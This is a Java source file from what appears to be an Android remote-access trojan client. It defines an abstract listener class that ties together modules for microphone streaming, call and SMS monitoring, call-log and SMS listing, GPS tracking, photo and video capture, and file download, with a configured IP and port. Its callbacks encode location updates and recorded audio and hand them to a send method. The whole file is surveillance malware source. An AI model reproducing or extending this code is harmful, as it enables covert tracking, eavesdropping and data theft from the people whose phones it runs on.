package my.app.activityclient;

import java.util.ArrayList;
import java.util.HashSet;

import my.app.Library.AdvancedSystemInfo;
import my.app.Library.AudioStreamer;
import my.app.Library.CallLogLister;
import my.app.Library.CallMonitor;
import my.app.Library.DirLister;
import my.app.Library.FileDownloader;
import my.app.Library.GPSListener;
import my.app.Library.PhotoTaker;
import my.app.Library.SMSLister;
import my.app.Library.SMSMonitor;
import my.app.Library.SystemInfo;
import my.app.Library.VideoStreaming;
import android.app.Activity;
import android.app.Service;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.hardware.Camera;
import android.location.Location;
import android.location.LocationListener;
import android.media.AudioRecord;
import android.media.AudioRecord.OnRecordPositionUpdateListener;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.os.Bundle;
import android.os.IBinder;
import android.telephony.SmsMessage;
import android.telephony.TelephonyManager;
import android.util.Log;
import android.view.SurfaceHolder;
import android.view.SurfaceView;
import android.widget.Toast;
import inout.Protocol;

public abstract class ClientListener extends Activity implements OnRecordPositionUpdateListener , LocationListener {
	
	public abstract void handleData(int channel, byte[] data); // C'est THE methode à implémenter dans Client

	public abstract void sendInformation(String infos);
	public abstract void sendError(String error);
	
	public abstract void loadPreferences();
	
	public AudioStreamer audioStreamer;
	public CallMonitor callMonitor;
	public CallLogLister callLogLister;
	public DirLister dirLister ;
	public FileDownloader fileDownloader;
	public GPSListener gps;
	public PhotoTaker photoTaker ;
	public SystemInfo infos;
	public Toast toast ;
	public SMSMonitor smsMonitor ;
	public AdvancedSystemInfo advancedInfos;
	public VideoStreaming videoStream;
	
	boolean waitTrigger;
	ArrayList<String> authorizedNumbersCall;
	ArrayList<String> authorizedNumbersSMS;
	ArrayList<String> authorizedNumbersKeywords;
	String ip;
	int port;
	
	SurfaceView view;
	
	public ClientListener() {
		super();
	    //IntentFilter filter = new IntentFilter("android.net.conn.CONNECTIVITY_CHANGE");
	    //registerReceiver(ConnectivityCheckReceiver, filter); //Il faudrait aussi le unregister quelquepart
	}
	
	public void onLocationChanged(Location location) {
		byte[] data = gps.encode(location);
		handleData(gps.getChannel(), data);
	}

	public void onProviderDisabled(String provider) {
		sendError("GPS desactivated");
	}

	public void onProviderEnabled(String provider) {
		sendInformation("GPS Activated");
	}

	public void onStatusChanged(String provider, int status, Bundle extras) {
		//We really don't care
	}
	
	
	public void onPeriodicNotification(AudioRecord recorder) {
		//Log.i("AudioStreamer", "Audio Data received !");
		try {
			byte[] data = audioStreamer.getData();
			if(data != null)
				handleData(audioStreamer.getChannel(), data);
		}
		catch(NullPointerException e) {
			
		}
	}
	
	public void onMarkerReached(AudioRecord recorder) {
		sendError("Marker reached for audio streaming");
	}
	

	
}
